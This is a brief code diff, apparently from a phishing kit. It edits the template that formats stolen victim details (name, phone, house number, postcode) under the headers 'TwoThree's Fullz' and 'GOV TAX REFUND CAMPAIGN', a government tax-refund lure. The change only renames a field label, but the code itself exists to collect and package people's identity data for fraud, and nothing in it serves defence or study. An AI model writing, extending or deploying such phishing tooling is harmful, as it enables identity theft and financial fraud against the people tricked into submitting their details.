@@ -45,7 +45,7 @@ if (req.body.phone_number) {
   -------- TwoThree's Fullz --------
   GOV TAX REFUND CAMPAIGN:
 
-  First Name: ${firstName}
+  Full Name: ${firstName}
   Phone num: ${phoneNum}
   House Number: ${address}
   Post code: ${postcode}
